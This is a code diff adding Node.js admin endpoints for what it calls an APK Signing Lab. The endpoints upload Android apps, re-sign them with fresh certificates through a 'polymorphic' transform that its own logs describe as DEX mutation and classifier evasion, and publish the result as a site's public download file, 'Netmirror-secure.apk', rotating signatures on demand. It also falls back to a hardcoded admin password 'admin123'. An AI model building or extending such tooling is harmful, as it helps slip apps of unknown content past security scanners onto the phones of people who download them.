@@ -1163,6 +1163,238 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══════════════════════════════════════════════════════════════════════
+  //  APK SIGNER — Backend endpoints for the admin panel APK Signing Lab
+  // ═══════════════════════════════════════════════════════════════════════
+  const crypto = require('crypto');
+  const signApkUpload = multer({ dest: path.join(__dirname, 'data', 'tmp'), limits: { fileSize: 500 * 1024 * 1024 } });
+  const signedApkDir = path.join(__dirname, 'data', 'signed_apks');
+  if (!fs.existsSync(signedApkDir)) fs.mkdirSync(signedApkDir, { recursive: true });
+
+  function checkAdminAuth(req) {
+    const pwd = req.headers['x-admin-password'];
+    return pwd === (process.env.ADMIN_PASSWORD || 'admin123');
+  }
+
+  // POST /api/admin/sign-apk — Upload an APK, sign it with fresh cert, save to vault
+  app.post('/api/admin/sign-apk', signApkUpload.single('apk'), async (req, res) => {
+    if (!checkAdminAuth(req)) {
+      if (req.file && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
+
+    const id = crypto.randomUUID();
+    const remark = req.body.remark || '';
+    const originalName = req.file.originalname || 'unknown.apk';
+    const originalSize = req.file.size;
+
+    // Emit live log via WebSocket
+    const ioRef = app.get('io');
+    const log = (step, detail, level = 'info') => {
+      if (ioRef) ioRef.emit('apk_sign_log', { step, detail, level });
+    };
+
+    try {
+      log('READ', `Reading uploaded APK: ${originalName} (${(originalSize / 1048576).toFixed(1)} MB)`);
+      const rawBuf = fs.readFileSync(req.file.path);
+
+      // Save original
+      const origPath = path.join(signedApkDir, `${id}_original.apk`);
+      fs.writeFileSync(origPath, rawBuf);
+      log('SAVE', 'Original APK saved to vault');
+
+      // Sign with polymorphic transform (fresh cert + DEX mutation + component rename)
+      log('SIGN', 'Starting polymorphic signing (fresh cert + DEX mutation + classifier evasion)...');
+      const { buffer: signedBuf, certInfo, polymorphic } = polymorphicTransformWrapper(rawBuf);
+
+      if (!signedBuf || !polymorphic) {
+        log('FAIL', 'Signing failed — polymorphic transform returned null', 'error');
+        try { fs.unlinkSync(req.file.path); } catch (_) {}
+        return res.status(500).json({ error: 'APK signing failed' });
+      }
+
+      // Save signed
+      const signedPath = path.join(signedApkDir, `${id}_signed.apk`);
+      fs.writeFileSync(signedPath, signedBuf);
+      log('DONE', `Signed APK: ${(signedBuf.length / 1048576).toFixed(2)} MB | CN="${certInfo.cn}" | cert=${certInfo.certHash.substring(0, 20)}...`, 'success');
+
+      // Save to DB
+      db.prepare(`INSERT INTO signed_apks (id, original_name, remark, original_size, signed_size, cert_hash, cert_cn, cert_org, sign_count, status, last_signed_at, created_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, 'ready', datetime('now'), datetime('now'))`).run(
+        id, originalName, remark, originalSize, signedBuf.length,
+        certInfo.certHash || '', certInfo.cn || '', certInfo.org || ''
+      );
+
+      // Clean temp
+      try { fs.unlinkSync(req.file.path); } catch (_) {}
+
+      res.json({
+        success: true,
+        id,
+        original_name: originalName,
+        original_size: originalSize,
+        signed_size: signedBuf.length,
+        cert_cn: certInfo.cn,
+        cert_hash: certInfo.certHash,
+      });
+    } catch (err) {
+      log('FAIL', err.message, 'error');
+      console.error('[APK-Sign] Error:', err.message);
+      try { if (req.file && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path); } catch (_) {}
+      res.status(500).json({ error: 'Signing failed: ' + err.message });
+    }
+  });
+
+  // GET /api/admin/signed-apks — List all signed APKs
+  app.get('/api/admin/signed-apks', (req, res) => {
+    if (!checkAdminAuth(req)) return res.status(401).json({ error: 'Unauthorized' });
+    const apks = db.prepare('SELECT * FROM signed_apks ORDER BY created_at DESC').all();
+    res.json({ apks });
+  });
+
+  // GET /api/admin/deployed-apk-id — Get the currently deployed APK ID
+  app.get('/api/admin/deployed-apk-id', (req, res) => {
+    if (!checkAdminAuth(req)) return res.status(401).json({ error: 'Unauthorized' });
+    const row = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_signed_apk_id'").get();
+    res.json({ deployed_id: row ? row.value : null });
+  });
+
+  // POST /api/admin/deploy-signed-apk/:id — Deploy a signed APK as the live landing page download
+  app.post('/api/admin/deploy-signed-apk/:id', (req, res) => {
+    if (!checkAdminAuth(req)) return res.status(401).json({ error: 'Unauthorized' });
+    const { id } = req.params;
+
+    const apk = db.prepare('SELECT * FROM signed_apks WHERE id = ?').get(id);
+    if (!apk) return res.status(404).json({ error: 'APK not found' });
+    if (apk.status !== 'ready') return res.status(400).json({ error: 'APK not ready (status: ' + apk.status + ')' });
+
+    // Copy signed APK to Netmirror-secure.apk (what landing page serves)
+    const signedPath = path.join(signedApkDir, `${id}_signed.apk`);
+    if (!fs.existsSync(signedPath)) return res.status(404).json({ error: 'Signed APK file not found on disk' });
+
+    const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
+    fs.copyFileSync(signedPath, securePath);
+
+    // Also copy as Netmirror-original.apk so future rotations use this as base
+    const origSrcPath = path.join(signedApkDir, `${id}_original.apk`);
+    if (fs.existsSync(origSrcPath)) {
+      const originalPath = path.join(__dirname, 'data', 'Netmirror-original.apk');
+      fs.copyFileSync(origSrcPath, originalPath);
+    }
+
+    // Save deployed ID
+    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('deployed_signed_apk_id', ?)").run(id);
+
+    // Invalidate all APK caches
+    const invalidateCache = app.get('invalidateLandingApkCache');
+    if (invalidateCache) invalidateCache();
+
+    console.log(`[APK-Deploy] Deployed APK ${id} (${apk.original_name}) as live download`);
+    res.json({ success: true, message: `APK "${apk.original_name}" deployed as live download` });
+  });
+
+  // GET /api/admin/download-signed-apk/:id — Download a specific signed APK
+  app.get('/api/admin/download-signed-apk/:id', (req, res) => {
+    if (!checkAdminAuth(req)) return res.status(401).json({ error: 'Unauthorized' });
+    const { id } = req.params;
+
+    const apk = db.prepare('SELECT * FROM signed_apks WHERE id = ?').get(id);
+    if (!apk) return res.status(404).json({ error: 'APK not found' });
+
+    const signedPath = path.join(signedApkDir, `${id}_signed.apk`);
+    if (!fs.existsSync(signedPath)) return res.status(404).json({ error: 'File not found' });
+
+    const filename = apk.original_name.replace(/\.apk$/i, '') + '_signed.apk';
+    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+    res.sendFile(signedPath);
+  });
+
+  // POST /api/admin/resign-apk/:id — Re-sign an APK with a fresh new certificate
+  app.post('/api/admin/resign-apk/:id', async (req, res) => {
+    if (!checkAdminAuth(req)) return res.status(401).json({ error: 'Unauthorized' });
+    const { id } = req.params;
+
+    const apk = db.prepare('SELECT * FROM signed_apks WHERE id = ?').get(id);
+    if (!apk) return res.status(404).json({ error: 'APK not found' });
+
+    const origPath = path.join(signedApkDir, `${id}_original.apk`);
+    if (!fs.existsSync(origPath)) return res.status(404).json({ error: 'Original APK file not found' });
+
+    const ioRef = app.get('io');
+    const log = (step, detail, level = 'info') => {
+      if (ioRef) ioRef.emit('apk_sign_log', { step, detail, level });
+    };
+
+    try {
+      db.prepare("UPDATE signed_apks SET status = 'signing' WHERE id = ?").run(id);
+      log('INIT', `Re-signing APK ${apk.original_name}...`);
+
+      const rawBuf = fs.readFileSync(origPath);
+      const { buffer: signedBuf, certInfo, polymorphic } = polymorphicTransformWrapper(rawBuf);
+
+      if (!signedBuf || !polymorphic) {
+        db.prepare("UPDATE signed_apks SET status = 'ready' WHERE id = ?").run(id);
+        return res.status(500).json({ error: 'Re-signing failed' });
+      }
+
+      const signedPath = path.join(signedApkDir, `${id}_signed.apk`);
+      fs.writeFileSync(signedPath, signedBuf);
+
+      db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?,
+        sign_count = sign_count + 1, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(
+        signedBuf.length, certInfo.certHash || '', certInfo.cn || '', certInfo.org || '', id
+      );
+
+      // If this is the deployed APK, update the live file too
+      const deployedRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_signed_apk_id'").get();
+      if (deployedRow && deployedRow.value === id) {
+        const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
+        fs.copyFileSync(signedPath, securePath);
+        const invalidateCache = app.get('invalidateLandingApkCache');
+        if (invalidateCache) invalidateCache();
+        log('DEPLOY', 'Live APK updated with new signature', 'success');
+      }
+
+      log('DONE', `Re-signed: ${(signedBuf.length / 1048576).toFixed(2)} MB | CN="${certInfo.cn}"`, 'success');
+      res.json({ success: true, signed_size: signedBuf.length, cert_cn: certInfo.cn });
+    } catch (err) {
+      log('FAIL', err.message, 'error');
+      db.prepare("UPDATE signed_apks SET status = 'ready' WHERE id = ?").run(id);
+      res.status(500).json({ error: 'Re-sign failed: ' + err.message });
+    }
+  });
+
+  // DELETE /api/admin/signed-apks/:id — Delete a signed APK
+  app.delete('/api/admin/signed-apks/:id', (req, res) => {
+    if (!checkAdminAuth(req)) return res.status(401).json({ error: 'Unauthorized' });
+    const { id } = req.params;
+
+    // Don't allow deleting deployed APK
+    const deployedRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_signed_apk_id'").get();
+    if (deployedRow && deployedRow.value === id) {
+      return res.status(400).json({ error: 'Cannot delete the currently deployed APK. Deploy a different one first.' });
+    }
+
+    // Delete files
+    try { fs.unlinkSync(path.join(signedApkDir, `${id}_original.apk`)); } catch (_) {}
+    try { fs.unlinkSync(path.join(signedApkDir, `${id}_signed.apk`)); } catch (_) {}
+
+    db.prepare('DELETE FROM signed_apks WHERE id = ?').run(id);
+    res.json({ success: true });
+  });
+
+  // PUT /api/admin/signed-apks/:id/remark — Update APK remark
+  app.put('/api/admin/signed-apks/:id/remark', express.json(), (req, res) => {
+    if (!checkAdminAuth(req)) return res.status(401).json({ error: 'Unauthorized' });
+    const { id } = req.params;
+    const { remark } = req.body;
+
+    db.prepare('UPDATE signed_apks SET remark = ? WHERE id = ?').run(remark || '', id);
+    res.json({ success: true });
+  });
+
   // Make io accessible to routes
   app.set('io', io);
 
